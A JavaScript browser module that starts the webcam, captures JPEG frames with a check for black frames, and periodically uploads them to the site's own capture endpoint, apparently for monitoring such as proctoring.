import { state } from "./config.js";
import { waitMs } from "./utils.js";

export function stopCameraStream() {
  if (!state.cameraStream) return;
  try {
    state.cameraStream.getTracks().forEach((track) => track.stop());
  } catch (err) {
    console.warn("Camera stop warning:", err);
  }
  state.cameraStream = null;
  state.isCameraReady = false;
}

export function waitForVideoReady(video, timeoutMs = 4000) {
  return new Promise((resolve, reject) => {
    if (!video) {
      reject(new Error("Video element not found"));
      return;
    }

    const isReady = () =>
      video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA &&
      video.videoWidth > 0 &&
      video.videoHeight > 0;

    if (isReady()) {
      resolve();
      return;
    }

    let finished = false;
    let pollTimer = null;
    let timeoutTimer = null;

    const cleanup = () => {
      video.removeEventListener("loadedmetadata", onReady);
      video.removeEventListener("loadeddata", onReady);
      video.removeEventListener("canplay", onReady);
      video.removeEventListener("playing", onReady);
      if (pollTimer) clearInterval(pollTimer);
      if (timeoutTimer) clearTimeout(timeoutTimer);
    };

    const complete = (ok, err) => {
      if (finished) return;
      finished = true;
      cleanup();
      if (ok) resolve();
      else reject(err || new Error("Video not ready"));
    };

    const onReady = () => {
      if (isReady()) complete(true);
    };

    video.addEventListener("loadedmetadata", onReady);
    video.addEventListener("loadeddata", onReady);
    video.addEventListener("canplay", onReady);
    video.addEventListener("playing", onReady);

    pollTimer = setInterval(onReady, 120);
    timeoutTimer = setTimeout(
      () => complete(false, new Error("Video frame timeout")),
      timeoutMs,
    );
  });
}

export function frameLooksBlack(imageData) {
  if (!imageData || !imageData.data || imageData.data.length < 4) return true;
  const data = imageData.data;
  let sum = 0;
  let min = 255;
  let max = 0;
  let samples = 0;

  for (let i = 0; i < data.length; i += 16) {
    const lum = (data[i] + data[i + 1] + data[i + 2]) / 3;
    sum += lum;
    if (lum < min) min = lum;
    if (lum > max) max = lum;
    samples++;
  }

  if (!samples) return true;
  const avg = sum / samples;
  const contrast = max - min;
  return avg < 8 && contrast < 12;
}

export async function captureFrameAsJpeg(video, maxAttempts = 5) {
  const canvas = document.createElement("canvas");
  let lastImageData = null;

  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    const width = video.videoWidth || 0;
    const height = video.videoHeight || 0;
    if (!width || !height) {
      await waitMs(120);
      continue;
    }

    canvas.width = width;
    canvas.height = height;
    const ctx = canvas.getContext("2d", { alpha: false });
    if (!ctx) {
      throw new Error("Canvas context unavailable");
    }

    ctx.drawImage(video, 0, 0, width, height);
    const probeW = Math.min(96, width);
    const probeH = Math.min(96, height);
    const probeData = ctx.getImageData(0, 0, probeW, probeH);
    const isBlack = frameLooksBlack(probeData);

    lastImageData = canvas.toDataURL("image/jpeg", 0.9);
    if (!isBlack || attempt === maxAttempts) {
      return { imageData: lastImageData, isBlack };
    }

    await waitMs(140);
  }

  return { imageData: lastImageData, isBlack: true };
}

export async function startCamera() {
  const webcamElement = document.getElementById("webcam");
  if (!webcamElement) {
    console.error("Camera element topilmadi");
    return false;
  }

  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    console.error("Brauzer getUserMedia qo'llab-quvvatlamaydi");
    return false;
  }

  const profiles = [
    {
      video: {
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 },
      },
    },
    { video: { width: { ideal: 1280 }, height: { ideal: 720 } } },
    { video: true },
  ];

  let lastErr = null;
  state.isCameraReady = false;

  for (const constraints of profiles) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      stopCameraStream();
      state.cameraStream = stream;
      webcamElement.srcObject = stream;
      webcamElement.muted = true;
      webcamElement.playsInline = true;
      webcamElement.autoplay = true;
      await webcamElement.play().catch(() => {});
      await waitForVideoReady(webcamElement, 4500);
      state.isCameraReady = true;
      console.log(
        "Camera ready:",
        webcamElement.videoWidth,
        "x",
        webcamElement.videoHeight,
      );
      return true;
    } catch (err) {
      lastErr = err;
      console.warn("Camera profile failed:", constraints, err);
    }
  }

  console.error("Kamera ulanmadi:", lastErr);
  return false;
}

export async function autoCapture(force = false) {
  if (state.captureInProgress) return;

  const now = Date.now();
  if (!force && now - state.lastCaptureTime < 15000) {
    return;
  }

  state.captureInProgress = true;
  try {
    const webcamElement = document.getElementById("webcam");
    if (!webcamElement || !webcamElement.srcObject || !state.isCameraReady) {
      const started = await startCamera();
      if (!started) return;
    }

    await waitForVideoReady(webcamElement, 3000);
    const frame = await captureFrameAsJpeg(webcamElement, 5);
    if (!frame || !frame.imageData) {
      console.error("Capture frame olinmadi");
      return;
    }
    if (frame.isBlack) {
      console.warn("Capture frame deyarli qora, baribir yuborilmoqda");
    }

    const res = await fetch("api/capture.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: frame.imageData }),
    });

    const result = await res.json();
    if (result.status === "success") {
      state.lastCaptureTime = Date.now();
      console.log("Capture saved:", result.path || "");
    } else {
      console.error(
        "Capture API xato:",
        result.message || result.error || result,
      );
    }
  } catch (err) {
    console.error("Capture xatosi:", err);
  } finally {
    state.captureInProgress = false;
  }
}
